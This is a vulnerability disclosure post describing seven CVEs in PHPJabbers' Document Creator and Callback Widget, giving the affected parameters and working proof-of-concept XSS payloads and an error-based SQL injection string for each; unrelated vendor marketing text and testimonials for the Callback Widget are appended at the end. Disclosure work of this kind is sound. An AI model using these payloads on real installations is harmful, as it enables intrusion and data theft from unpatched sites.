Today, I want to share some vulnerabilities discovered through a recent collaborative security research project. This was done through a local group called the Atlantic CyberSecurity Collective.

Our team, consisting of a diverse and talented group of researchers, has conducted an extensive security review on the PHPJabbers collection of scripts, and during our research, we came across some significant security vulnerabilities. It’s worth mentioning that these vulnerabilities, if exploited, could potentially pose serious threats to user data and the overall integrity of these products. We submitted our findings to MITRE, a globally recognized cybersecurity standards organization. Consequently, these vulnerabilities were validated and assigned the following Common Vulnerabilities and Exposures (CVE) identifiers:

* CVE-2023–36309
* CVE-2023–36310
* CVE-2023–36311
* CVE-2023–36312
* CVE-2023–36313
* CVE-2023–36314
* CVE-2023–36315

Note that we are all professionals with full time jobs and other responsibilities. With the sheer amount of products in the PHP Jabbers lineup and limited time available, we weren’t able to assess every single product. There is a lot of code reuse in those applications, so it would be safe to assume most vulnerabilities are present in other products.

Members of the research group conducted some additional research in PHP Jabbers products and found vulnerabilities which aren’t addressed in this disclosure.

We informed the PHP Jabbers team through their online forms, but were completely ignored. Each of our attempts at communicating these vulnerabilities was met with silence and an almost instantaneous “closed” status to our submitted tickets.

Our intentions behind sharing this information aren’t to tarnish the vendor’s reputation or stir up panic among its user base. Instead, we aim to encourage proactive and transparent collaboration within the cybersecurity community. It’s crucial to remember that we all share the same goal — enhancing the overall security of products and fostering a safer digital world for users.

In the sections to follow, we will delve into each of the identified vulnerabilities:

# #1: Reflected XSS in the action parameter of Document Creator

(CVE-2023–36309)

Replace the action parameter in a request to index.php value with %3Cimg+src%3Dx+onerror%3Dprompt%28%29%3E, it will direct to another page where our payload is executed.

![]()
# #2: Reflected XSS in the column parameter of Document Creator

(CVE-2023–36310)

Replace the action parameter in a request to index.php value with %3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E.

![]()
# #3: SQL injection in the column parameter of Document Creator

(CVE-2023–36311)

Replace the column parameter value with: 1 AND (SELECT 4172 FROM(SELECT COUNT(\*),CONCAT(0x71786a7071,(SELECT (ELT(4172=4172,1))),0x716a6a7871,FLOOR(RAND(0)\*2))x FROM INFORMATION\_SCHEMA.PLUGINS GROUP BY x)a)&direction=ASC&row\_count=15&page=18.

![]()
# #4: Stored XSS in multiple POST parameters of the form fields in Callback Widget

(CVE-2023–36312)

We go to the “Options” tab, then to the “Form fields” tab under it.

![]()

All affected parameters can be exploited with the same payload.

The affected parameters are:

value-enum-o\_bf\_include\_name, value-enum-o\_bf\_include\_email, value-enum-o\_bf\_include\_phone, value-enum-o\_bf\_include\_company, value-enum-o\_bf\_include\_address, value-enum-o\_bf\_include\_country, value-enum-o\_bf\_include\_state, value-enum-o\_bf\_include\_city, value-enum-o\_bf\_include\_zip, value-enum-o\_bf\_include\_notes, value-enum-o\_bf\_include\_captcha, value-enum-o\_bf\_include\_calltime and value-enum-o\_bf\_include\_timezone.

We capture the request once we save the form and edit the value of one of our vulnerable parameters to “%22%3E%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E” then forward the request.

![]()

The script tag should now be stored in the form field.

![]()
# #5: Reflected XSS in multiple POST parameters of export requests in Callback Widget

(CVE-2023–36313)

Go to “Callback Requests” -> “Export Requests”, fill the fields then click “Get Feed URL”, capture the request in Burp Suite.

![]()

Now in Burp Suite we will edit any POST parameter’s value to contain “%3C%2Ftextarea%3E%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E%3C” except for the “request\_feed” parameter which is not vulnerable or the “password” parameter which is instead vulnerable to the payload “%22%3E%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E”, forward the request.

![]()
# #6: Reflected XSS in notifications of Callback Widget

(CVE-2023–36314)

Go to “Options” -> “Notifications”, fill all the fields then submit the message to capture it in burp. Replace the value to “%3C%2Ftextarea%3E%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E%3Ctextarea%3E” for any of the following parameters value-text-o\_email\_request\_message, value-text-o\_sms\_request\_message, value-text-o\_admin\_email\_request\_message or value-text-o\_sms\_email\_request\_message

![]()![]()![]()![]()
# #7: Reflected XSS in the action parameter of Callback Widget

(CVE-2023–36315)

Replace the value of the action parameter with %3Cimg%20src=x%20onerror=prompt()%3E&err=AO01

## Product Highlights

Add a Callback Widget on your website and make it easier for your potential customers to get in touch with your customer support or sales team. The request callback widget can be integrated into any website, including WordPress and Joomla sites. The front end of the PHP script consists of a callback button and an editable callback form.

 Editable Callback Form

Depending on the information you need to collect from your clients, you can customize the callback request form and enable or disable fields or add required fields.

 Email & SMS Notifications

You can create autoresponder messages that are sent via email or SMS both to clients and admins upon a new callback request. To enable the SMS functionality, just [contact us](contact.php).

 Different Callback Reasons

According to their type of business, script admins can predefine different reasons for callbacks that will appear in the request callback form. These can be edited and enabled or disabled at any time.

 Mobile-Friendly & Modern Design

The Callback Widget's front end can be loaded across various devices and screen sizes. The callback form is available in 10 different color variations designed to best match your website branding.

 Automatic Time Conversion

In order to prevent potential time difference mix-ups, the best time to call and the timezone specified by customers is automatically converted to the default time set in the back-end system.

 Export Callback Requests

Generate CSV and XML files for the callback requests in any selected period. You can also import iCal to Google Calendar. Password-protect your data so only authorized people have access.

 Multi-Language Support

Translate all titles and alerts in the front end and back end to any language you need. Search for specific text parts and use the unique text IDs to add the translations in a new language.

 PHP Source Code Customization

Buy the Callback Widget with a Developer License and make your own modifications to the source code. We can also customize the callback form for you upon request. [Compare licenses](callback-widget/#sectionPricing)

I am very impressed with the scripts you provide, and for non-highly technical users like me, your PHP scripts are so easy to use. Plus, you just saved me money and time for installing the scripts for me. Your customer service is unbeatable.

You guys are great! Your PHP scripts helped me to upgrade my websites. Your after-sales help is the best I have ever had. I can't thank you enough. Anyone who doesn't give PHPJabbers a try will be missing out! Thanks again! I'll be back for more! And I mean it too!
